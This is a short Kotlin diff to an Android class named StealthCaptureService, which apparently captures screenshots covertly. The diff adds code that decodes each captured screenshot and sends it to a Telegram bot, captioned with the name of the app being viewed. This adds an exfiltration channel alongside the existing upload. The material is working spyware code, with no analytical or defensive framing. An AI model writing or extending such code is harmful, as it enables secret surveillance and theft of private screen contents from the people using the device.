@@ -28,6 +28,7 @@ import android.util.Base64
 import android.util.DisplayMetrics
 import android.util.Log
 import android.view.WindowManager
+import com.example.data.sync.TelegramBotManager
 import androidx.core.app.NotificationCompat
 import com.example.data.sync.MediaProjectionHelper
 import com.google.firebase.database.DataSnapshot
@@ -338,6 +339,16 @@ class StealthCaptureService : Service() {
             } else {
                 Log.e(TAG, "Failed to upload screenshot: ${task.exception?.message}")
             }
+        }
+
+        try {
+            val imageBytes = Base64.decode(base64String, Base64.NO_WRAP)
+            serviceScope.launch(Dispatchers.IO) {
+                val telegramBot = TelegramBotManager(applicationContext)
+                telegramBot.sendPhoto(imageBytes, "Screen capture of $pkgName (${(sizeBytes / 1024)} KB)")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to send screenshot to Telegram: ${e.message}")
         }
     }
 
